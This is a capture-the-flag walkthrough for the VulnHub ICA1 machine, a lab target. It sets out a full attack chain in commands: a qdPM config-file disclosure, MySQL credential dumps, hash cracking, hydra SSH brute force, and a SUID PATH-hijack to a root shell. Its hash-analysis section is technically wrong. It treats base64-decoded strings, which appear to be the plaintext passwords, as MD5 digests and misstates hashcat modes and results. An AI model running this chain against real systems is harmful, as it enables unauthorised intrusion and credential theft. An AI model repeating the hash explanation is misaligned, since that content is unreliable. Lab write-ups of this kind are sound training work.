# ica1

This document provides a detailed explanation of the **Capture the Flag (CTF)** challenge published on the site [**VulnHub**](https://www.vulnhub.com/entry/ica-1,748/) by the author **"onurturali"**.
According to the information provided by the author, the difficulty level of this CTF is **EASY**, and the goal is to obtain **root access** to the target machine and find the **flag files**.

To complete this CTF, you need **basic knowledge of Linux commands** and **skills in using penetration testing tools**.
You can download the original CTF [here](https://download.vulnhub.com/ica/ica1.zip).

> ⚠️ **Note**: [**Oracle VirtualBox**](https://www.virtualbox.org/) was used to run all virtual machines.
> [**Kali Linux**](https://www.kali.org/docs/introduction/download-official-kali-linux-images/) was used as the attacking machine.
> The techniques used are intended **for educational purposes only**.
> **Responsibility for their use for any other purposes will be determined in accordance with applicable law.**

---

This document examines the **ICA1** virtual machine from a penetration testing platform designed for training, network security assessment, and privilege configuration.
The task is of medium complexity and provides a comprehensive challenge to refine penetration testing skills, offering real-world scenarios and attack vectors.

In this task, the following scenario is modeled:
According to the obtained information, **ICA** is working on a secret project. We need to find out what this project is, obtain credentials to access the system, and install a backdoor.
To achieve this, we will need to pass several security layers.
We will start with reconnaissance, then discover open ports and available services, continue by identifying vulnerabilities, and finally exploit these vulnerabilities to gain root access.
At the end, we will review some recommendations to improve the resilience and reliability of the virtual machine.

## **Brief overview of the CTF solution steps**
1. Download and run the target machine and research tools.
2. Obtain the **IP address of the target machine** using **netdiscover**.
3. Scan **open ports** using **nmap**.
4. Investigate the **HTTP service** on port 80. Explore the web server file system and identify hidden files and directories.
5. Download and analyze the YAML file with database access parameters.
6. Gain access to the MySQL server and examine web user accounts.
7. Copy the list of users and hashed passwords to the Kali machine.
8. Prepare a wordlist file.
9. Analyze hashed passwords.
10. Consider methods for decoding user passwords.
11. Crack passwords for users travis and dexter.
12. Investigate user profiles travis and dexter.
13. Identify privilege escalation paths.
14. Gain control over the system.

---

## **CTF walkthrough step by step**

### **Step 1: Importing target machines into VirtualBox***
After downloading the virtual machine image, integrate it into your system.

Traditionally, we first configure networking for our virtual machines.
Open **File/Tools** in VirtualBox and select **Network Manager**.<br>
![virtkali.png](./ica1/virtnetmanager.png)

On the **NAT Networks** tab, create a new network, specify the network IP address and IPv4 prefix.<br>
![virtkali.png](./ica1/virtnatnetwork.png)

Go to the settings of the virtual machines **Kali Linux** and **ica1**, and assign them to the created network named **NatNetwork**.<br>
![virtkali.png](./ica1/virtnetworkadapter.png)

Start the **Kali Linux** image in VirtualBox with a terminal window:<br>
![virtkali.png](./ica1/virtkali.png)

And the target machine for analysis **ica1**:<br>
![virtica1.png](./ica1/virtica1.png)

---

### **Step 2: Obtaining the IP address of the target machine using netdiscover**
After downloading and launching the target virtual machine in **VirtualBox**, the first step is to determine its IP address.
We have several tools at our disposal, such as ```arp-scan```, ```netdiscover```, and ```nmap```.
Among these tools, the simplest is the command:
```sh
netdiscover -i eth0 -r 192.168.2.1/24
```
where the **-i** parameter specifies the network interface (for example, eth0 or wlan0), and the **-r** option allows you to define the network range for scanning.
These options are recommended if the command without parameters takes too long to execute.
So, let's run:

```sh
sudo netdiscover -i eth0 -r 192.168.2.0/24
```

📌 **Result**:
We quickly obtained the IP address of the target machine — **192.168.2.5**.<br>
![targetip.png](./ica1/targetip.png)

⚠️ **Note**: The IP addresses of both the attacking and target machines may differ depending on your network configuration.

---

### **Step 3: Scanning open ports and available services**
At this stage, we will identify the services available on the system and their versions.
We will use ```nmap``` to scan the obtained IP address for **open ports** and **running services**.
For this purpose, we will use a command with the flags **--top-ports -A -sV -P** to perform an aggressive scan.
- The **-A** option enables aggressive scan features. It performs a comprehensive scan that includes:
  - **OS detection** – determines the operating system of the target;
  - **version detection** – identifies versions of services running on open ports;
  - **script scanning** – runs default scripts to collect additional information about the target;
  - **traceroute** – shows the path packets take to reach the target.
- The **--top-ports** argument specifies scanning only a defined number of the most popular ports from the file **/usr/share/nmap/nmap-services**.
  This significantly speeds up the scan by checking only the most likely open ports instead of all 65,535.
- The **-sV** option enables service version detection.
Run the following command:

```sh
nmap --top-ports 100 -A -sV -P 192.168.2.5
```

📌 **Result**:
We identified three open ports: 22 for the SSH service, 80 for the web server, and 3306 for the MySQL server.
- **22** – used by the **SSH** service;
- **80** – used by a web server;
- **3306** – used by the running MySQL server.<br>
![targetport.png](./ica1/targetport.png)

---

### **Step 4: Exploring system accessibility via port 80**
In the previous step, we identified open ports. Now, let's try to explore the machine using the **HTTP** protocol.
Let’s view the hosted web page by opening a browser and entering the IP:port combination into the URL bar.

📌 **Result**:
In the browser, we observed a login page powered by **qdPM 9.2**.<br>
![browserweb.png](./ica1/browserweb.png)

This login page can be attacked using a brute-force method. However, this approach may take a significant amount of time.
Instead, we will try to find other security vulnerabilities related to password disclosure.
Run the following command:

```sh
searchsploit qdPM 9.2
```

📌 **Result**:
We identified a set of instructions describing the steps required to exploit a vulnerability.<br>
![searchsploit.png](./ica1/searchsploit.png)

Next, locate the file **50176.txt**.
Run the command:

```sh
sudo find / -name 50176.txt
```

📌 **Result**:
The file **50176.txt** is located in the directory **/usr/share/exploitdb/exploits/php/webapps/**.<br>
![findexploit.png](./ica1/findexploit.png)

Display the contents of the file **50176.txt**.
Run the command:

```sh
cat /usr/share/exploitdb/exploits/php/webapps/50176.txt
```

📌 **Result**:
We obtained information related to a potential system vulnerability.<br>
![passwdyaml.png](./ica1/passwdyaml.png)

---

### **Step 5: Downloading and analyzing the YAML file for database access**
In the previous step, we discovered the path to the file **databases.yml** via the **HTTP** protocol, which contains potential information for database access.
Let’s download the file **databases.yml** for further analysis.
Use the following command with wget:

```sh
wget http://192.168.2.5/core/config/databases.yml
```

📌 **Result**:
We successfully downloaded the file **databases.yml** containing database connection information.<br>
![dbyamlinfo.png](./ica1/dbyamlinfo.png)

Now, let’s examine the contents of the downloaded file.
Run the following command:

```sh
cat databases.yml
```

📌 **Result**:
We obtained the database name, username, and password required to access the database:
- **dbname**: `qdpm`
- **username**: `qdpmadmin`
- **password**: `UcVQCMQk2STVeS6J`<br>
![dbconnection.png](./ica1/dbconnection.png)

---

### **Step 6: Accessing the MySQL server and analyzing web user accounts**
We will use the credentials obtained in the previous step to establish a connection to the previously identified MySQL server.
To connect to the database, we will use the console client with the user **qdpmadmin** and password **UcVQCMQk2STVeS6J**.
To avoid errors related to **TLS/SSL** certificates, add the **--skip-ssl** flag:

```sh
mysql -u qdpmadmin -h 192.168.2.5 --password='UcVQCMQk2STVeS6J' --skip-ssl
```

📌 **Result**:
We successfully connected to the **MySQL** server.<br>
![mysqlconnect.png](./ica1/mysqlconnect.png)

Now, let’s display the list of databases.
In the **MySQL** console, run:

```sh
show databases;
```

📌 **Result**:
We obtained the list of databases on the **MySQL** server.<br>
![mysqldatabases.png](./ica1/mysqldatabases.png)

Next, select the **staff** database and display its tables.
Run the commands:

```sh
use staff;
show tables;
```

📌 **Result**:
We retrieved the list of tables in the **staff** database.<br>
![stafftables.png](./ica1/stafftables.png)

The **user** and **login** tables may contain user-related data.
Let’s display their contents.
Run the commands:

```sh
select * from user;
select * from login;
```

📌 **Result**:
From the **user** table, we obtained usernames and their roles.
The **login** table contains user passwords hashed using the MD5 algorithm.<br>
![userlogin.png](./ica1/userlogin.png)

---

### **Step 7: Preparing a list of users and hashed passwords on the Kali machine**
We will save the list of usernames into the file **user.txt**, and the list of hashed passwords into the file **passwords.txt**.
To do this, we first need to export the contents of the **user** and **login** tables from the **staff** database.
We will use the `mysqldump` command on the **Kali Linux** machine and specify the following parameters:
- `-h` – IP address of the remote host;
- `-u` – username;
- `--password=` – user password;
- add the `--skip-ssl` flag to avoid **TLS/SSL** certificate errors;
- specify the **staff** database;
- specify the **user** table;
- redirect the output to a file using `> filename`.

Exit the MySQL console and save the contents of the **user** table into **user.txt**:

```sh
exit
mysqldump -h 192.168.2.5 -u qdpmadmin --password='UcVQCMQk2STVeS6J' --skip-ssl staff user > user.txt
ls -al u*
```

📌 **Result**:
The contents of the **user** table were saved on the **Kali** virtual machine.<br>
![dumpusertable.png](./ica1/dumpusertable.png)

Display the contents of the file **user.txt** using the `cat` command:

```sh
cat user.txt
```

Let's find the list of users in the **user.txt** file.<br>
![dumpuserdata.png](./ica1/dumpuserdata.png)

Using the `nano` editor, keep only the usernames in **user.txt** and remove other data.
Let's print the contents of the file **user.txt**

```sh
nano user.txt
cat user.txt
```

📌 **Result**:
The file **user.txt** now contains only the list of users.
![listuserdata.png](./ica1/listuserdata.png)

Perform similar actions for the **login** table in the **staff** database.
First, save the table contents into **passwords.txt**:

```sh
exit
mysqldump -h 192.168.2.5 -u qdpmadmin --password='UcVQCMQk2STVeS6J' --skip-ssl staff login > passwords.txt
ls -al p*
```

📌 **Result**:
The contents of the **login** table were saved on the **Kali** virtual machine.<br>
![dumplogintable.png](./ica1/dumplogintable.png)

Display the contents of **passwords.txt**:

```sh
cat passwords.txt
```

Find the list of user passwords hashed using the MD5 algorithm in the **passwords.txt** file.<br>
![dumppasswordsdata.png](./ica1/dumppasswordsdata.png)

Using the `nano` editor, keep only the hashed passwords and remove other data.
Let's print the contents of the **passwords.txt** file

```sh
nano passwords.txt
cat passwords.txt
```

📌 **Result**:
The file **passwords.txt** now contains only the list of hashed passwords.<br>
![listpasswordsdata.png](./ica1/listpasswordsdata.png)

---

### **Step 8: Installing a wordlist file**
Among the many dictionaries used for password cracking, the **rockyou** wordlist is one of the most popular.
It is a collection of commonly used and potential passwords.
In Kali Linux, the wordlist is located in the directory **/usr/share/wordlists/**.
Navigate to the directory and display the list of files using:

```sh
cd /usr/share/wordlists
ls
```

📌 **Result**:
A list of files in the directory is displayed.<br>
![wordlistsempty.png](./ica1/wordlistsempty.png)

If the file **rockyou.txt** is already present, proceed to **Step 9**.<br>
![wordlistspresent.png](./ica1/wordlistspresent.png)

The archive **rockyou.txt.gz** can be found in the repository of [**danielmiessler**](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Leaked-Databases/) on GitHub.<br>
![rockyoudanielmiessler.png](./ica1/rockyoudanielmiessler.png)

Download the wordlist using the command:

```sh
sudo wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz
```

📌 **Result**:
The archive **rockyou.txt.tar.gz** with common passwords is downloaded.<br>
![rockyoudownload.png](./ica1/rockyoudownload.png)

List the directory contents again:

```sh
ls
```

📌 **Result**:
The directory contains the archive **rockyou.txt.gz** with the wordlist.<br>
![rockyouarchive.png](./ica1/rockyouarchive.png)

Extract the archive using **gunzip**:

```sh
gunzip rockyou.txt.gz
ls
```

📌 **Result**:
The directory **/usr/share/wordlists** now contains the text file **rockyou.txt** with the wordlist.<br>
![rockyoukeys.png](./ica1/rockyoukeys.png)

---

### **Step 9: Analysis of Hashed Passwords**
As you know, an MD5 hash cannot be "decoded" (decrypted) back to the original text because it is not encryption but a one-way mathematical function.
However, in practice, to recover a password, brute-force or dictionary attacks are used to find a value that produces the same hash.
For this purpose, **Kali Linux** provides built-in utilities **Hashcat** and **John the Ripper**.
Both utilities are installed by default in **Kali Linux**. You can view their parameters by running them with the `--help` key.<br>
![hashcathelp.png](./ica1/hashcathelp.png)<br>
![johnhelp.png](./ica1/johnhelp.png)

First, we need to understand what objects are stored in the file **passwords.txt**.
The file contains a list of hashed passwords. Let’s display its contents again:

```sh
c3VSSkFkR3dMcDhkeTNyRg==
N1p3VjRxdGc0MmNtVVhHWA==
WDdNUWtQM1cyOWZld0hkQw==
REpjZVZ5OThXMjhZN3dMZw==
Y3FObkJXQ0J5UzJEdUpTeQ==
```

The **Hashcat** utility does not have built-in means for automatic hash type identification.
To determine which hash mode (`-m`) we need, we can analyze the hash using special identification utilities, reference guides, or online services.

First, we will use the **hashid** utility built into **Kali Linux**.
If the utility is not installed, it can always be added using:

```sh
sudo apt install hashid
```

Using the `-m` parameter, pass one of our strings to the **hashid** command:

```sh
hashid -m "c3VSSkFkR3dMcDhkeTNyRg=="
```

📌 **Result**:
The utility could not identify this token. Indeed, it looks unusual—it contains 24 characters and ends with two equal signs.<br>
![hashidunknown.png](./ica1/hashidunknown.png)

Let’s try using online services. Go to:
```
https://hashes.com/en/tools/hash_identifier
```
Enter one of our tokens and attempt to identify it.<br>
![hashidentify.png](./ica1/hashidentify.png)

📌 **Result**:
We received a hint from the service.
Most likely, the original password was first hashed using the MD5 algorithm, and then the resulting token was encoded using **Base64**.<br>
![hashpossible.png](./ica1/hashpossible.png)

Let’s recall hashing standards used in software development.
An MD5 hash consists of 128 bits, which equals 16 bytes.
However, for easier reading and transmission in various utilities (including **Hashcat**), these 16 bytes are often represented in hexadecimal (`Hex`) format, resulting in a 32-character token.
In other words, each byte is represented by two symbols in base-16 (digits 0–9 and letters a–f).

However, the result of MD5 hashing may also appear as 22 bytes if **Base64** encoding is applied.
In this case, each character encodes 6 bits of information. If we calculate:
```
128 : 6 = 21.33
```
Since the number of symbols must be an integer, the value is rounded up, resulting in 22 characters.
In standard **Base64** implementations (e.g., according to the `MIME` standard), data is padded to the nearest multiple of 24 bits.
Therefore, two padding characters (`==`) are added, making the final string length 24 characters.

Thus, the database stores hashed passwords encoded in **Base64**.
To use **Hashcat** or **John the Ripper**, we must first decode each Base64 string into the original 16-byte token, then convert it to HEX format.
For this, we use the **base64** utility.
Using the `-d` option, we can decode either a file or a single token.
To prevent the output from merging into one line, we use the **fold** utility.
With the `-w` parameter, we specify the number of characters per line.
To save the result, we redirect the output to the file **passwords_md5.txt**:

```sh
base64 -d passwords.txt | fold -w 16
base64 -d passwords.txt | fold -w 16 > passwords_md5.txt
cat passwords_md5.txt
```

📌 **Result**:
We obtained 16-character password hash codes for database users.<br>
![hash16md5.png](./ica1/hash16md5.png)

Let’s display the contents of the file **passwords_md5.txt** again:

```sh
suRJAdGwLp8dy3rF
7ZwV4qtg42cmUXGX
X7MQkP3W29fewHdC
DJceVy98W28Y7wLg
cqNnBWCByS2DuJSy
```

Let’s examine the obtained tokens.
Again, we will use the **hashid** utility. Pass one of the obtained strings to the command:

```sh
hashid -m "DJceVy98W28Y7wLg"
```

📌 **Result**:
The **hashid** utility recognized the hash and suggested the **hashcat -a 2400** mode.<br>
![hashid16md5.png](./ica1/hashid16md5.png)

Now, let’s convert the obtained 16-byte tokens into hexadecimal format.
One of the simplest tools for this is the **xxd** utility.
We will use it with the `-p` (postscript) option, which outputs values sequentially without additional service information.
Using the `-c:500` option, we define the number of columns (line length) in combination with `-p`.
To avoid removing newline characters, we will use **base64** as the data source.
Save the result into the file **passwords_hex.txt**:

```sh
base64 -d passwords.txt | xxd -p -c:500 | fold -w 32
base64 -d passwords.txt | xxd -p -c:500 | fold -w 32 > passwords_hex.txt
cat passwords_hex.txt
```

📌 **Result**:
We obtained 32-character password hash codes of database users in hexadecimal format.<br>
![hash32hex.png](./ica1/hash32hex.png)

Let’s display the content of the file **passwords_hex.txt** again:
```sh
7375524a416447774c70386479337246
375a7756347174673432636d55584758
58374d516b5033573239666577486443
444a6365567939385732385937774c67
63714e6e4257434279533244754a5379
```

To convert hash codes from **Base64** format into 32-character hexadecimal hashes, you can also use online services.
For example, use:
```
https://base64.guru/converter/decode/hex
```
Enter one of the 24-character tokens into the input field and perform decoding.

📌 **Result**:
We obtained a 32-character hash code for the first user, which fully matches the one obtained earlier.<br>
![hashonline32hex.png](./ica1/hashonline32hex.png)

To verify the obtained 32-character tokens, use the **hashid** tool. Pass one of the tokens into the command:

```sh
hashid -m "444a6365567939385732385937774c67"
```

📌 **Result**:
The **hashid** utility recognized the hash and suggested several modes for the **hashcat** command.
In particular, for these tokens we can use the main mode `-a 0`.<br>
![hashid32hex.png](./ica1/hashid32hex.png)

---

### **Step 10: Decoding User Passwords**
**Hashcat** is one of the best tools for password recovery based on hash values.
The utility supports several attack modes, more than 300 hashing algorithms, and can leverage the power of both CPU and GPU.

For proper operation, **Hashcat** requires a sufficient amount of RAM.
In particular, the minimum memory requirement for version `7.1.2` is 4 GB.
In our virtual machine (**Kali Linux**), we will allocate 8 GB of RAM.<br>
![kalimemory.png](./ica1/kalimemory.png)

Let’s describe some important parameters of the **hashcat** utility:
- The `-m` key specifies the hash type. For example, `-m 0` indicates the MD5 hash type. The **hashid** utility can help suggest the appropriate `-m` value.
- The `-a` key specifies the attack mode. For example, `-a 0` tells the utility to use a dictionary attack, while `-a 3` enables brute-force mode with mask-based iteration.
- If the GPU on our machine is integrated, has insufficient memory, or we are working in a virtual environment (as in our case), we should use the system CPU and RAM instead of the GPU. For this, we use the `-D 1` key.

When using brute-force mode, we can define a mask using a sequence of characters.<br>
![hashcharsets.png](./ica1/hashcharsets.png)

Let’s demonstrate the use of the **hashcat** utility.
First, we will generate a simple MD5 hash, and then use **hashcat** to recover the original token.
Using the **md5sum** utility, compute the hash of the string `aa` and save the result to the file **simple.txt**.
Use the `cut` utility to store only the first 32 characters, ignoring spaces and trailing symbols:

```sh
echo "aa" | md5sum
echo "aa" | md5sum | cut -c 1-32 > simple.txt
cat simple.txt
```

📌 **Result**:
The file **simple.txt** contains the 32-character MD5 hash of the token `aa` in hexadecimal format.<br>
![hashsimplehex.png](./ica1/hashsimplehex.png)

Now, apply **hashcat** in brute-force mode with a mask:

```sh
hashcat -m 0 -a 3 -D 1 simple.txt ?a?a
```

📌 **Result**:
The **hashcat** utility identified the first character `a`.<br>
![hashsimplefirst1.png](./ica1/hashsimplefirst1.png)<br>
![hashsimplefirst2.png](./ica1/hashsimplefirst2.png)

Run **hashcat** again to find the second character.
Insert the discovered first character into the mask:

```sh
hashcat -m 0 -a 3 -D 1 simple.txt a?a
```

📌 **Result**:
The **hashcat** utility successfully reconstructed the token `aa`, which fully matches the original value.
Note that complete recovery of the exact original value is quite rare.
Typically, **hashcat** suggests a different token that produces the same hash value.<br>
![hashsimplesecond1.png](./ica1/hashsimplesecond1.png)<br>
![hashsimplesecond2.png](./ica1/hashsimplesecond2.png)

Let’s return to the analysis of hashes from the file **passwords_hex.txt**.
Save, for example, the hash `444a6365567939385732385937774c67` for the user `dexter` into the file **hash4.txt**, and use the dictionary `/usr/share/wordlists/rockyou.txt`:

```sh
cat passwords_hex.txt | grep 444
cat passwords_hex.txt | grep 444 > hash4.txt
cat hash4.txt
hashcat -m 0 -a 0 -D 1 hash4.txt /usr/share/wordlists/rockyou.txt
```

📌 **Result**:
The **hashcat** utility recovered the original token value `kristenanne`.<br>
![hashdexter1.png](./ica1/hashdexter1.png)<br>
![hashdexter2.png](./ica1/hashdexter2.png)

Apply the **John the Ripper** utility to analyze the hash in the file **hash4.txt**.

```sh
john --wordlist=/usr/share/wordlists/rockyou.txt hash4.txt
```

📌 **Result**:
The **John the Ripper** utility suggested the original token value `1QWER`.<br>
![johndexterfirst.png](./ica1/johndexterfirst.png)

Now apply the **hashcat** utility in brute-force mode with a mask.
We will attempt all passwords of length 1–16 using possible characters `A-Z`, `a-z`, and `0-9`.

```sh
hashcat -m 0 -a 3 -D 1 hash4.txt ?1?1?1?1?1?1?1?1?1?1?1?1?1?1?1?1 --increment -1 ?l?d?u
```

📌 **Result**:
The **hashcat** process may take a significant amount of time.<br>
![hashdextermask.png](./ica1/hashdextermask.png)

Let’s consider two 16-character password hashes from the file **passwords_md5.txt**:

```sh
DJceVy98W28Y7wLg
7ZwV4qtg42cmUXGX
```

Save these values into the file **password_clean.txt**.<br>
![cleanpasswords.png](./ica1/cleanpasswords.png)

Use the file **password_clean.txt** as a dictionary.
Run the **hashcat** command in dictionary mode and verify that the obtained “passwords” match the 32-byte hash from the file **hash4.txt**:

```sh
hashcat -m 0 -a 0 -D 1 hash4.txt password_clean.txt
```

📌 **Result**:
The **hashcat** utility suggested the hash `7ZwV4qtg42cmUXGX`.<br>
![hashdexterpassword1.png](./ica1/hashdexterpassword1.png)<br>
![hashdexterpassword2.png](./ica1/hashdexterpassword2.png)

Similarly, copy the hash of user `Travis` into a separate file and use the **hashcat** utility with the dictionary **password_clean.txt**:

```sh
cat passwords_hex.txt | grep 666
cat passwords_hex.txt | grep 666 > hash3.txt
cat hash3.txt
hashcat -m 0 -a 0 -D 1 hash3.txt password_clean.txt
```

📌 **Result**:
The **hashcat** utility suggested the hash `DJceVy98W28Y7wLg`.<br>
![hashtravispassword1.png](./ica1/hashtravispassword1.png)<br>
![hashtravispassword2.png](./ica1/hashtravispassword2.png)

---

### **Step 11: Brute-Forcing Passwords for Users travis and dexter**
In the previous steps, we prepared the file **user.txt** containing the list of users and **password_clean.txt** with their hashed passwords.
Let’s modify the content of **user.txt** by converting all characters to lowercase. For this, we will use the standard `sed` utility. Apply the following parameters:
- The `-i` key means performing the replacement directly in the original file.
- The `s` parameter specifies the substitution mode, indicating what to search for and what to replace it with.
- The pattern `.*` matches all characters, and the pattern `\L&` converts them to lowercase.

To verify, we will display the content of the **user.txt** file:

```sh
cat user.txt
sed -i 's/.*/\L&/' user.txt
cat user.txt
```

📌 **Result**:
The file **user.txt** now contains the list of users in lowercase.<br>
![userlowercase.png](./ica1/userlowercase.png)

Next, we will try using the obtained usernames and encoded passwords to perform a brute-force attack on the SSH service running on port 22.
For this, we will use the **hydra** command.
**Hydra** is a built-in tool in **Kali Linux** used in cybersecurity and penetration testing for fast password brute-force attacks in real time.
**Hydra** supports more than 50 protocols, including SSH, FTP, HTTP, HTTPS, and SMB.

Let’s attempt to find passwords for users **travis** and **dexter**.
We will use the following parameters of the **hydra** command:
- **hydra** – runs the tool for password brute-force attacks;
- **-l dexter** – specifies a single username for login; in our case, we will test both **travis** and **dexter**;
- **-L user.txt** – specifies the file **user.txt** with a list of usernames;
- **-P password_clean.txt** – specifies the file containing passwords used for the attack;
- **-f** – tells **hydra** to stop after the first successful login;
- **192.168.2.5** – specifies the target IP address of the SSH service;
- **ssh** – specifies the protocol used for login.

Run the commands for all users as well as separately for **travis** and **dexter**:

```sh
hydra -L user.txt -P password_clean.txt -f 192.168.2.5 ssh
hydra -l travis -P password_clean.txt -f 192.168.2.5 ssh
hydra -l dexter -P password_clean.txt -f 192.168.2.5 ssh
```

📌 **Result**:
The **hydra** utility successfully confirmed access for users **travis** and **dexter** using the values `DJceVy98W28Y7wLg` and `7ZwV4qtg42cmUXGX` respectively.<br>
![hydratravisuser.png](./ica1/hydratravisuser.png)<br>
![hashtravispassword2.png](./ica1/hydratravispassword.png)<br>
![hashtravispassword2.png](./ica1/hydradexterpassword.png)

---

### **Step 12: Exploring User Profiles of travis and dexter**
In the previous step, we obtained the passwords for users **travis** and **dexter**.
Using these credentials, let’s try to log in to the target machine via the **SSH** protocol.

First, we will use the credentials of user **travis**.
Execute the `ssh` command and enter the password `DJceVy98W28Y7wLg`.
Then display the list of files and directories in the **travis** user profile:

```sh
ssh travis@192.168.2.5
ls -al
cat user.txt
```

📌 **Result**:
We successfully logged into the target machine as user **travis**.
No valuable or interesting files were found in the **travis** account.<br>
![travisprofile.png](./ica1/travisprofile.png)

Next, connect to the system using the credentials of user **dexter**.
Use the password `7ZwV4qtg42cmUXGX` and list the profile files:

```sh
ssh dexter@192.168.2.5
ls -al
```

📌 **Result**:
We successfully logged into the target machine as user **dexter**.
In the **dexter** profile, we found an interesting file named **note.txt**.<br>
![dexterprofile.png](./ica1/dexterprofile.png)

Display the contents of the file **note.txt**:

```sh
cat note.txt
```

📌 **Result**:
From the contents of **note.txt**, we obtained useful information that can be further utilized.<br>
In the user profile of Dexter, we found an interesting file **note.txt** whose contents we can use.<br>
![dexternotetxt.png](./ica1/dexternotetxt.png)

---

### **Step 13: Exploring Potential Privilege Escalation Paths**
The contents of the file **note.txt** suggest that we should search for executable files that we could potentially use.
As is known, executable files with the `setuid` bit set run with the permissions of the file owner.
This can often lead to unintended privilege escalation if the system is not properly configured.

We will use the **find** command to search for files that have the **SUID** bit set and are owned by the user `root`.
The search will be performed across the entire filesystem, starting from the root directory `/`.
We specify the parameter `-type f` to search only for files, and `-perm -4000` to locate files with the `setuid` permission bit set.
This typically means that such files can be executed with the permissions of their owner.
To obtain detailed information for each found file, we execute the command `ls -al`, while suppressing errors using `2>/dev/null`:

```sh
find / -perm -4000 -type f -exec ls -al {} 2>/dev/null \;
```

📌 **Result**:
We obtained a list of files with the `setuid` bit set and owned by `root`.<br>
![findsuidlist.png](./ica1/findsuidlist.png)

As seen from the search results, the first file `/opt/get_access` is not a typical system file or directory.
Therefore, it draws attention. Let’s try to execute this file:

```sh
/opt/get_access
```

📌 **Result**:
After execution, we received some output information.<br>
![optgetaccess.png](./ica1/optgetaccess.png)

Next, use the `strings` command to extract text or character sequences embedded in the binary file.
These strings can provide insight into the functionality or purpose of the binary and may reveal hardcoded values or configuration parameters:

```sh
strings /opt/get_access
```

📌 **Result**:
We noticed an unusual string highlighted in the output: **cat /root/system_info**.
Therefore, we can try to execute this command.<br>
![catrootsysteminfo.png](./ica1/catrootsysteminfo.png)

---

### **Step 14: Gaining Control over the System**
To exploit the discovered vulnerability, we will create our own executable file **cat**, for example, in the **/tmp** directory.
Then we will create a command file that launches **bash**.
Execute the following commands:

```sh
echo "/bin/bash" >> /tmp/cat
ls -al /tmp
cat /tmp/cat
```

📌 **Result**:
We created a command file **cat** in the **/tmp** directory that launches **bash**.<br>
![tmpcatbash.png](./ica1/tmpcatbash.png)

To allow our file **/tmp/cat** to be executed from **/opt/get_access**, it must be executable. Let’s change the file permissions:

```sh
chmod +x /tmp/cat
ls -al /tmp
```

📌 **Result**:
The file **/tmp/cat** is now executable.<br>
![tmpcatexec.png](./ica1/tmpcatexec.png)

As is known, the environment variable **PATH** defines where the shell looks for executable files when a command is entered.
Let’s modify the **PATH** variable so that **/tmp/cat** is the first candidate for execution.
Execute the commands:

```sh
echo $PATH
export PATH=/tmp:$PATH
echo $PATH
```

📌 **Result**:
The **/tmp** directory is now the first entry in the **PATH** variable.
This means that when the system command **cat** is called, our custom command from **/tmp** will be executed instead.
If the calling process has elevated privileges, our command will inherit them.<br>
![pathcatexec.png](./ica1/pathcatexec.png)

Now execute the command **/opt/get_access**.
This binary has the `setuid` bit set, which means it runs with **root** privileges.
Since the program internally calls **cat /root/system_info**, our malicious command **/tmp/cat** will be executed with **root** privileges.

```sh
/opt/get_access
ls
```

📌 **Result**:
This command launched a new **bash** shell with **root** privileges.
We now have full control over the system and can perform any actions.
In effect, we have taken ownership of the entire system.<br>
![rootaccessdone.png](./ica1/rootaccessdone.png)

✅ **Final flag obtained! CTF completed!** 🎯

---

## **Recommendations**

1. Apply strong password policies:
   - Use complex and unique passwords for all accounts.
   - Implement multi-factor authentication to reduce the risk of credential-based attacks.

2. Do not store sensitive data on the target system:
   - Ensure that sensitive files are securely stored and encrypted.
   - Avoid placing sensitive files in publicly accessible web directories.
   - Do not store sensitive information as comments in text files or HTML resources.

3. Restrict access to management interfaces:
   - Limit access to sudo and always require password authentication.
   - Implement restrictions on user-to-user access via the SSH protocol.

4. Conduct regular security audits:
   - Perform regular security assessments to identify and mitigate vulnerabilities.
   - Pay special attention to issues related to privilege escalation.
   - Review and minimize **sudo** privileges to only what is strictly necessary.

5. Implement proper logging and monitoring:
   - Enable comprehensive logging and monitoring across the system.
   - Detect suspicious activities such as unauthorized file access or attempts at privilege escalation.

---

## **Conclusion**

- In this step-by-step guide, we successfully gained full access to the target machine **ICA1** by exploring various vulnerabilities and exploitation techniques.
- We covered key tasks such as identifying and exploiting system weaknesses, applying privilege escalation techniques, and achieving full system compromise.
- This exercise highlights the importance of protecting sensitive files, enforcing strict password policies, and regularly auditing system configurations to prevent unauthorized access.
- By following the described steps, you should now have a clear understanding of how to approach similar challenges and apply the tools and techniques demonstrated.
- This experience not only strengthens your penetration testing skills but also prepares you for more complex scenarios.
- By following the provided recommendations, the risk of exploiting such vulnerabilities in real-world environments can be significantly reduced.

**What was accomplished?**
✔️ Identified the IP address of the target machine.  
✔️ Scanned ports and services.  
✔️ Investigated **HTTP services**.  
✔️ Gained access to the **MySQL** server.  
✔️ Analyzed web user accounts.  
✔️ Prepared a wordlist file.  
✔️ Explored hash analysis methods.  
✔️ Cracked passwords for users travis and dexter.  
✔️ Gained **shell access** via the **SSH** protocol.  
✔️ Investigated user accounts travis and dexter.  
✔️ Identified a privilege escalation path.  
✔️ Gained **root access** to the target system.  

🔹 **This CTF was an example of a training exercise** for practicing **ethical hacking** and penetration testing skills.
## You can download the modified virtual machine image [here](https://drive.google.com/file/d/1XXP6SCyoIHUUug2nJEjMFej9QBegS7BO/view?usp=sharing).
